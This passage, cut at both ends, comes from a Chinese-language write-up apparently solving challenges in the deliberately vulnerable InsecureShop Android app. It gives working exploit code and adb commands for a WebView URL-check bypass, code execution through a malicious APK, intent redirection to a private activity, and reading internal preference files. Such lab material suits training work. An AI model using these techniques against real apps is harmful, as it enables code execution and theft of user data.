class="string">&quot;insecureshopapp.com&quot;</span>, <span class="literal">false</span>, <span class="number">2</span>, <span class="literal">null</span>)) &#123;</span><br><span class="line">                <span class="type">Intent</span> <span class="variable">intent3</span> <span class="operator">=</span> getIntent();</span><br><span class="line">                Intrinsics.checkExpressionValueIsNotNull(intent3, <span class="string">&quot;intent&quot;</span>);</span><br><span class="line">                <span class="type">Uri</span> <span class="variable">data3</span> <span class="operator">=</span> intent3.getData();</span><br><span class="line">                data = data3 != <span class="literal">null</span> ? data3.getQueryParameter(<span class="string">&quot;url&quot;</span>) : <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent4</span> <span class="operator">=</span> getIntent();</span><br><span class="line">        Intrinsics.checkExpressionValueIsNotNull(intent4, <span class="string">&quot;intent&quot;</span>);</span><br><span class="line">        <span class="type">Uri</span> <span class="variable">data4</span> <span class="operator">=</span> intent4.getData();</span><br><span class="line">        data = data4 != <span class="literal">null</span> ? data4.getQueryParameter(<span class="string">&quot;url&quot;</span>) : <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line">    webview.loadUrl(data);</span><br><span class="line">    Prefs.INSTANCE.getInstance(<span class="built_in">this</span>).setData(data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看一下这段代码的逻辑</p><ol><li>获取uri对象用的path对象</li><li>判断path中是否包含<code>/webview</code></li><li>解析path，判断<code>?url=</code>参数是否为空</li><li>判断url参数是否以<code>insecureshopapp.com</code> 结尾</li><li>把url参数存放到data</li><li>最后使用webview.loadUrl(data);</li></ol><p>可以通过#进行绕过，payload如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell am start - a android.intent.action.VIEW - d insecureshop://com.insecureshop/webview?url=https://www.baidu.com%23insecureshopapp.com</span><br></pre></td></tr></table></figure><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_Grgi5ZxN0i.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_Grgi5ZxN0i.png"></p><h2 id="任意代码执行"><a href="#任意代码执行" class="headerlink" title="任意代码执行"></a><strong>任意代码执行</strong></h2><p>通过第三方包上下文执行任意代码。</p><p>在LoginActivity发现以下代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (PackageInfo info : getPackageManager().getInstalledPackages(<span class="number">0</span>)) &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">packageName</span> <span class="operator">=</span> info.packageName;</span><br><span class="line">    <span class="keyword">if</span> (packageName.startsWith(<span class="string">&quot;com.insecureshopapp&quot;</span>)) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Context</span> <span class="variable">packageContext</span> <span class="operator">=</span> createPackageContext(packageName, Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY);</span><br><span class="line">            <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> packageContext.getClassLoader()</span><br><span class="line">                .loadClass(<span class="string">&quot;com.insecureshopapp.MainInterface&quot;</span>)</span><br><span class="line">                .getMethod(<span class="string">&quot;getInstance&quot;</span>, Context.class)</span><br><span class="line">                .invoke(<span class="literal">null</span>, <span class="built_in">this</span>);</span><br><span class="line">            Log.d(<span class="string">&quot;object_value&quot;</span>, value.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RuntimeException</span>(e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>代码分析：</p><ol><li>首先回去遍历已经安装的应用包，获取每个应用的packageName</li><li>检查包名中是否以<code>com.insecureshopapp</code> 开头</li><li>动态加载包中的类，使用 createPackageContext 创建目标包的上下文（Context）。参数 3 表示 Context.CONTEXT_INCLUDE_CODE |<br>Context.CONTEXT_IGNORE_SECURITY，即允许加载代码并忽略安全限制。</li><li>使用 ClassLoader 动态加载目标包中的 com.insecureshopapp.MainInterface 类。</li></ol><p>那么我们可以创建一个恶意apk <code>com.insecureshopapp</code> 类MainInterface编写getInstance方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.insecureshopapp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.util.Log;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.BufferedReader;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStreamReader;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainInterface</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title function_">getInstance</span><span class="params">(Context context)</span> &#123;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">output</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ProcessBuilder</span>(<span class="string">&quot;sh&quot;</span>, <span class="string">&quot;-c&quot;</span>, <span class="string">&quot;whoami;ls /data/data/com.insecureshop/&quot;</span>).start();</span><br><span class="line">            <span class="type">BufferedReader</span> <span class="variable">reader</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedReader</span>(<span class="keyword">new</span> <span class="title class_">InputStreamReader</span>(process.getInputStream()));</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="literal">null</span>) &#123;</span><br><span class="line">                output.append(line).append(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            process.waitFor();</span><br><span class="line">            Log.d(<span class="string">&quot;MainInterface&quot;</span>, <span class="string">&quot;Command Output: &quot;</span> + output.toString());</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据操作系统版本进行更换</p><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_2pvnImPG9-.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_2pvnImPG9-.png"></p><p>编辑apk，安装</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb install debug/app-debug.apk</span><br></pre></td></tr></table></figure><p>查看日志</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">OnePlus5T:/ ## cd /data/data/com.insecureshopOnePlus5T:/data/data/com.insecureshop ## ls</span><br><span class="line">app_textures  app_webview  cache  code_cache  shared_prefs</span><br><span class="line">OnePlus5T:/data/data/com.insecureshop ## logcat | grep <span class="string">&quot;MainInterface&quot;</span><span class="number">01</span>-<span class="number">22</span> <span class="number">16</span>:<span class="number">16</span>:<span class="number">57.386</span>  <span class="number">6422</span>  <span class="number">6422</span> D MainInterface: Command Output: u0_a191</span><br><span class="line"><span class="number">01</span>-<span class="number">22</span> <span class="number">16</span>:<span class="number">16</span>:<span class="number">57.386</span>  <span class="number">6422</span>  <span class="number">6422</span> D MainInterface: app_textures</span><br><span class="line"><span class="number">01</span>-<span class="number">22</span> <span class="number">16</span>:<span class="number">16</span>:<span class="number">57.386</span>  <span class="number">6422</span>  <span class="number">6422</span> D MainInterface: app_webview</span><br><span class="line"><span class="number">01</span>-<span class="number">22</span> <span class="number">16</span>:<span class="number">16</span>:<span class="number">57.386</span>  <span class="number">6422</span>  <span class="number">6422</span> D MainInterface: cache</span><br><span class="line"><span class="number">01</span>-<span class="number">22</span> <span class="number">16</span>:<span class="number">16</span>:<span class="number">57.386</span>  <span class="number">6422</span>  <span class="number">6422</span> D MainInterface: code_cache</span><br><span class="line"><span class="number">01</span>-<span class="number">22</span> <span class="number">16</span>:<span class="number">16</span>:<span class="number">57.386</span>  <span class="number">6422</span>  <span class="number">6422</span> D MainInterface: shared_prefs</span><br></pre></td></tr></table></figure><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximage0122_zwr_-2rCSw.gif" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximage0122_zwr_-2rCSw.gif"></p><h2 id="访问受保护的组件"><a href="#访问受保护的组件" class="headerlink" title="访问受保护的组件"></a><strong>访问受保护的组件</strong></h2><p>应用程序接收嵌入的Intent并将其传递给如startActivity方法。这允许任何第三方应用程序启动任何受保护的组件。</p><p>正如挑战描述所建议的，应该有一个意图传递给<code>startActivity</code>函数。我搜索了代码，在<code>com.insecureshop.WebView2Activity</code><br>中发现了以下这段引起了我的注意：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">    setContentView(R.layout.activity_webview);</span><br><span class="line">    setSupportActionBar(findViewById(R.id.toolbar));</span><br><span class="line">    setTitle(R.string.webview);</span><br><span class="line">    <span class="type">Intent</span> <span class="variable">extraIntent</span> <span class="operator">=</span> getIntent().getParcelableExtra(<span class="string">&quot;extra_intent&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (extraIntent != <span class="literal">null</span>) &#123;</span><br><span class="line">        startActivity(extraIntent);</span><br><span class="line">        finish();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;```</span><br><span class="line"></span><br><span class="line">这里的代码正在等待接收一个带有键 `extra_intent` 的 Intent，但危险的部分在于接收到的 Intent 被传递给了 `startActivity`</span><br><span class="line">函数，这将允许我们访问应用程序中的任何 Intent，即使它没有被导出。让我们在我们的应用中查找这样的 Activity：</span><br><span class="line"></span><br><span class="line">```jsx</span><br><span class="line">&lt;activity</span><br><span class="line">    android:name=<span class="string">&quot;com.insecureshop.PrivateActivity&quot;</span> android:exported=<span class="string">&quot;false&quot;</span>/&gt;</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">data</span> <span class="operator">=</span> getIntent().getStringExtra(<span class="string">&quot;url&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (data == <span class="literal">null</span>) &#123;</span><br><span class="line">        data = <span class="string">&quot;https://www.insecureshopapp.com&quot;</span>; </span><br><span class="line">    &#125;</span><br><span class="line">    webview.loadUrl(data);</span><br><span class="line">    Prefs.INSTANCE.getInstance(<span class="built_in">this</span>).setData(data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>PrivateActivity</code> 是一个未导出的活动，不能直接访问，因此我们可以利用 <code>WebView2Activity</code> 中出现的漏洞来访问它。我们有两种方法可以利用这个漏洞：使用<br>ADB AM 命令或创建一个攻击应用程序。不幸的是，我尝试了很多次 am 命令，但没能找到正确的命令。所以让我们创建一个攻击应用程序。我将通过<br>Android Studio 创建一个带有空活动的应用程序，并添加以下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.insecureshop2;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Intent;</span><br><span class="line"><span class="keyword">import</span> android.os.Bundle;</span><br><span class="line"><span class="keyword">import</span> android.view.View;</span><br><span class="line"><span class="keyword">import</span> android.widget.Button;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.activity.EdgeToEdge;</span><br><span class="line"><span class="keyword">import</span> androidx.appcompat.app.AppCompatActivity;</span><br><span class="line"><span class="keyword">import</span> androidx.core.graphics.Insets;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.ViewCompat;</span><br><span class="line"><span class="keyword">import</span> androidx.core.view.WindowInsetsCompat;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MainActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="type">Button</span> <span class="variable">IntentButton</span> <span class="operator">=</span> (Button) findViewById(R.id.button);</span><br><span class="line">        <span class="comment">// Set a click listener to send the intent</span></span><br><span class="line">        IntentButton.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> &#123;</span><br><span class="line">                <span class="comment">// Making an Intent to the PrivateActivity with the extra &quot;url&quot;</span></span><br><span class="line">                <span class="type">Intent</span> <span class="variable">privateActivityIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                privateActivityIntent.setClassName(<span class="string">&quot;com.insecureshop&quot;</span>, <span class="string">&quot;com.insecureshop.PrivateActivity&quot;</span>);</span><br><span class="line">                privateActivityIntent.putExtra(<span class="string">&quot;url&quot;</span>, <span class="string">&quot;https://www.baidu.com&quot;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="comment">// Passing the whole intent to the extra_intent So we trigger the startActivity in the WebView2Activity class</span></span><br><span class="line">                <span class="type">Intent</span> <span class="variable">webViewIntent</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Intent</span>();</span><br><span class="line">                webViewIntent.setClassName(<span class="string">&quot;com.insecureshop&quot;</span>, <span class="string">&quot;com.insecureshop.WebView2Activity&quot;</span>);</span><br><span class="line">                webViewIntent.putExtra(<span class="string">&quot;extra_intent&quot;</span>, privateActivityIntent);</span><br><span class="line">                startActivity(webViewIntent);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;```</span><br><span class="line"></span><br><span class="line">添加button</span><br><span class="line"></span><br><span class="line">![183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_KoJW88-lC1.png](../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_KoJW88-lC1.png)</span><br><span class="line"></span><br><span class="line">利用演示</span><br><span class="line"></span><br><span class="line">![183e7c086b3081bf800fe3e88ab4f232/Pulrgximage0121_EEEKdY5NTA.gif](../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximage0121_EEEKdY5NTA.gif)</span><br><span class="line"></span><br><span class="line">## **未受保护的数据URI**</span><br><span class="line"></span><br><span class="line">通过loadUrl方法传递的不受信任的URI允许攻击者在webview中传递任意URL。</span><br><span class="line"></span><br><span class="line">这个挑战与其他挑战类似，我们在 `com.insecureshop.WebView2Activity` 中有一个被导出的隐式 Intent。但这次它接受我们传入的任何值，并尝试用</span><br><span class="line">WebView 加载，这意味着我们也可以访问内部文件。</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line"> <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">        Intrinsics.checkExpressionValueIsNotNull(intent, <span class="string">&quot;intent&quot;</span>);</span><br><span class="line">        <span class="type">String</span> <span class="variable">dataString</span> <span class="operator">=</span> intent.getDataString();</span><br><span class="line">        <span class="keyword">if</span> (!(dataString == <span class="literal">null</span> || StringsKt.isBlank(dataString))) &#123;</span><br><span class="line">            <span class="type">Intent</span> <span class="variable">intent2</span> <span class="operator">=</span> getIntent();</span><br><span class="line">            Intrinsics.checkExpressionValueIsNotNull(intent2, <span class="string">&quot;intent&quot;</span>);</span><br><span class="line">            webview.loadUrl(intent2.getDataString());</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;```</span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line">adb shell  am start -n com.insecureshop/.WebView2Activity -d file:<span class="comment">///data/data/com.insecureshop/shared_prefs/Prefs.xml</span></span><br></pre></td></tr></table></figure><p><img src="/../imgs/183e7c086b3081bf800fe3e88ab4f232/Pulrgximageimage_en3-Hbq6NK.png" alt="183e7c086b3081bf800fe3e88ab4f232&#x2F;Pulrgximageimage_en3-Hbq6NK.png"></p><h2 id="任意文件窃取"><a href="#任意文件窃取" class="headerlink" title="任意文件窃取"></a><strong>任意文件窃取</strong></h2><p>通过ChooserActivity可以窃取应用程序本地存储中的文件。</p><p>找到相应代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">ChooserActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> HashMap _$_findViewCache;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> _$_clearFindViewByIdCache() &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">hashMap</span> <span class="operator">=</span> <span class="built_in">this</span>._$_findViewCache;</span><br><span class="line">        <span class="keyword">if</span> (hashMap != <span class="literal">null</span>) &#123;</span><br><span class="line">            hashMap.clear();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> View _$_findCachedViewById(<span class="type">int</span> i) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>._$_findViewCache == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="built_in">this</span>._$_findViewCache = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">View</span> <span class="variable">view</span> <span class="operator">=</span> (View) <span class="built_in">this</span>._$_findViewCache.get(Integer.valueOf(i));</span><br><span class="line">        <span class="keyword">if</span> (view != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> view;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">View</span> <span class="variable">findViewById</span> <span class="operator">=</span> findViewById(i);</span><br><span class="line">        <span class="built_in">this</span>._$_findViewCache.put(Integer.valueOf(i), findViewById);</span><br><span class="line">        <span class="keyword">return</span> findViewById;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.appcompat.app.AppCompatActivity, androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle savedInstanceState)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(C0781R.layout.activity_chooser);</span><br><span class="line">        <span class="type">Intent</span> <span class="variable">intent</span> <span class="operator">=</span> getIntent();</span><br><span class="line">        Intrinsics.checkExpressionValueIsNotNull(intent, <span class="string">&quot;intent&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (intent.getExtras() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="type">Parcelable</span> <span class="variable">parcelableExtra</span> <span class="operator">=</span> getIntent().getParcelableExtra(<span class="string">&quot;android.intent.extra.STREAM&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (parcelableExtra == <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">TypeCastException</span>(<span class="string">&quot;null cannot be cast to non-null type android.net.Uri&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">Uri</span> <span class="variable">uri</span> <span class="operator">=</span> Uri.fromFile(<span class="keyword">new</span> <span class="title class_">File</span>(((Uri) parcelableExtra).toString()));</span><br><span class="line">            Intrinsics.checkExpressionValueIsNotNull(uri, <span class="string">&quot;Uri.fromFile(File(uri.toString()))&quot;</span>);</span><br><span class="line">            makeTempCopy(uri, getFilename(uri));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> Uri <span class="title function_">makeTempCopy</span><span class="params">(Uri fileUri, String original_filename)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">StringBuilder</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">            <span class="type">File</span> <span class="variable">externalStorageDirectory</span> <span class="operator">=</span> Environment.getExternalStorageDirectory();</span><br><span class="line">            Intrinsics.checkExpressionValueIsNotNull(externalStorageDirectory, <span class="string">&quot;Environment.getExternalStorageDirectory()&quot;</span>);</span><br><span class="line">            sb.append(externalStorageDirectory.getAbsolutePath());</span><br><span class="line">            sb.append(File.separator);</span><br><span class="line">            sb.append(<span class="string">&quot;insecureshop&quot;</span>);</span><br><span class="line">            <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> sb.toString();</span><br><span class="line">            <span class="type">File</span> <span class="variable">directory</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">            <span class="keyword">if</span> (!directory.exists()) &#123;</span><br><span class="line">                directory.mkdirs();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">File</span> <span class="variable">fileTemp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path, original_filename);</span><br><span class="line">            fileTemp.createNewFile();</span><br><span class="line">            <span class="type">Uri</span> <span class="variable">fromFile</span> <span class="operator">=</span> Uri.fromFile(fileTemp);</span><br><span class="line">            <span class="type">InputStream</span> <span class="variable">openInputStream</span> <span class="operator">=</span> getContentResolver().openInputStream(fileUri);</span><br><span class="line">            <span class="type">OutputStream</span> <span class="variable">openOutputStream</span> <span class="operator">=</span> getContentResolver().openOutputStream(fromFile);</span><br><span class="line">            <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];</span><br><span class="line">            <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="type">Integer</span> <span class="variable">len</span> <span class="operator">=</span> openInputStream != <span class="literal">null</span> ? Integer.valueOf(openInputStream.read(bArr)) : <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">if</span> (len != <span class="literal">null</span> &amp;&amp; len.intValue() == -<span class="number">1</span>) 